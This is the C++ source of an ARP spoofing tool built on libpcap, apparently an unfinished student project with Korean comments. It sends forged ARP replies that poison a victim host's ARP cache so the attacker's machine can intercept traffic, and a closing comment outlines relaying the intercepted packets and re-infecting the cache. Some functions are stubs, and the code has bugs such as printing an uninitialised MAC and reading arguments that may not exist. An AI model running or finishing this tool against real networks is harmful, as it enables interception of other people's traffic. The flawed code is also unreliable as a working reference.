#include <cstdio>
#include <pcap.h>
#include <cstring>
#include "ethhdr.h"
#include "arphdr.h"

#include <unistd.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/socket.h>

#include <map>
struct EthArpPacket {
    EthHdr eth_;
    ArpHdr arp_;
};

struct ArpInfo{
    Mac mac_;
    Ip ip_;
};


void usage() {
    printf("syntax : arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
    printf("sample : arp-spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
}

void get_my_mac(char * interface, unsigned char * mac) {
    int sock = socket(PF_INET, SOCK_DGRAM, 0);
    struct ifreq req;

    if (sock < 0) {
        perror("socket");
        exit(EXIT_FAILURE);
    }

    memset(&req, 0, sizeof(req));
    strncpy(req.ifr_name, interface, IF_NAMESIZE - 1);

    if (ioctl(sock, SIOCGIFHWADDR, &req) < 0) {
        perror("ioctl");
        exit(EXIT_FAILURE);
    }
    memcpy(mac, (unsigned char *)req.ifr_hwaddr.sa_data, 6);
    printf("my_mac:");
    for(int i = 0 ; i <6; i++)
        printf("%02X:", mac[i]);
    close(sock);
}

void get_my_ip(char * interface, char* ip_buffer){
    int fd;
    struct ifreq ifr;

    fd = socket(AF_INET, SOCK_DGRAM, 0);

    ifr.ifr_addr.sa_family = AF_INET;

    strncpy(ifr.ifr_name, interface, IFNAMSIZ-1);

    ioctl(fd, SIOCGIFADDR, &ifr);
    close(fd);

    sprintf(ip_buffer,"%s", inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr));
}

void make_arp_packet(EthArpPacket* buf, uint8_t smac[], uint32_t sip, uint8_t tmac[], uint32_t tip, int op){
    EthArpPacket packet;

    packet.eth_.dmac_ = Mac(tmac);
    packet.eth_.smac_ = Mac(smac);
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(op);
    packet.arp_.smac_ = Mac(smac);
    packet.arp_.sip_ = htonl(Ip(sip));
    if(op == ArpHdr::Request) memset(tmac, 0 ,6);
    packet.arp_.tmac_ = Mac(tmac);
    packet.arp_.tip_ = htonl(Ip(tip));

    memcpy(buf, &packet, sizeof(EthArpPacket));
}

void send_arp_packet(pcap_t * handle, EthArpPacket * packet){
    int res = pcap_sendpacket(handle, reinterpret_cast<const uint8_t *>(packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }
}

void infect_arp_table(pcap_t * handle, ArpInfo* sender, ArpInfo* I, char * ip, Ip target){
    // 브로드 캐스트를 보내고 (arp request) 이를 잡아서 정보를 업데이트. 업데이트 하는 시점은 , 인자로 주어진 ip에 대한 정보가 존재하지 않을때?(key-value)로 저장해야하나?
    EthArpPacket arp_packet;
    Mac smac = Mac("FF:FF:FF:FF:FF:FF");
    Ip sip = Ip(ip);

    make_arp_packet(&arp_packet, I->mac_, I->ip_, smac, sip, ArpHdr::Request);
    send_arp_packet(handle, &arp_packet);

    while(true){
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle, &header, &packet); // 잡은 패킷에 대해 맥이랑 ip만 바꿔주면 된다
        if (res == 0) continue;
        if (res == -1 || res == -2) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        }

        EthArpPacket * arp_reply_packet = (EthArpPacket *)packet;
        if(arp_reply_packet->eth_.type() == EthHdr::Arp && arp_reply_packet->arp_.op() == ArpHdr::Reply) {
            memcpy(&arp_packet, arp_reply_packet, sizeof(EthArpPacket));
            break;
        }

    }
    sender->mac_ = arp_packet.eth_.smac_;
    sender->ip_ = arp_packet.arp_.sip();
    //void make_arp_packet(EthArpPacket* buf, uint8_t smac[], uint32_t sip, uint8_t tmac[], uint32_t tip, int op){
    make_arp_packet(&arp_packet, I->mac_, target, sender->mac_, sender->ip_, ArpHdr::Reply);
    send_arp_packet(handle, &arp_packet);
    // info update



}

void update_arp_table(ArpInfo sender, ArpInfo target, ArpInfo attacker){ // reply 패킷만 보내는 용도!!
    //make_arp_packet();
    //send_arp_packet();
    //make_arp_packet();
    //send_arp_packet();
}


int main(int argc, char * argv[]) {
    if(argc < 3 || argc % 2 != 0){
        usage();
        return -1;
    }

    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if(handle == nullptr){
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    ArpInfo I;
    get_my_mac(argv[1], I.mac_);
    // 고쳐야 할 곳 ********
    char ip_buffer[18];
    get_my_ip(argv[1], ip_buffer);
    I.ip_ = Ip(ip_buffer);

    EthArpPacket arp_packet;
    ArpInfo sender;
    ArpInfo target;

    Ip temp1 = Ip(argv[3]);
    Ip temp2 = Ip(argv[5]);

    infect_arp_table(handle, &sender, &I, argv[2], temp1);
    //infect_arp_table(handle, &target, &I, argv[4], temp2);
    for(int i = 0 ; i <6; i++)
        printf("%02x", sender.mac_[i]);

    printf("\n");
    for(int i = 0 ; i <6; i++)
        printf("%02x", target.mac_[i]);

//    while(true){
//        struct pcap_pkthdr* header;
//        const u_char* packet;
//        int res = pcap_next_ex(handle, &header, &packet); // 잡은 패킷에 대해 맥이랑 ip만 바꿔주면 된다
//        if (res == 0) continue;
//        if (res == -1 || res == -2) {
//            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
//            break;
//        }
//
//        EthArpPacket * arp_reply_packet = (EthArpPacket *)packet;
//        if(ntohs(arp_reply_packet->eth_.type_) == EthHdr::Arp) {
//            //update_arp_table
//        }
//
//    }


    pcap_close(handle);


}




/*
 1. arp table attack(send-arp) sender & target 둘 다 감염
 2. get spoofed packet
 3. send relay packet
 4. (In NAT, this is rare) target send to sender arp request(broadcast)
 5. arp cache expired -> sender send arp request(broadcast)
 6. sender send unicast
 7. redo 1!!

 그러나 여러 센더와 타겟을 관리해야 하는 어려움 존재한다.
 */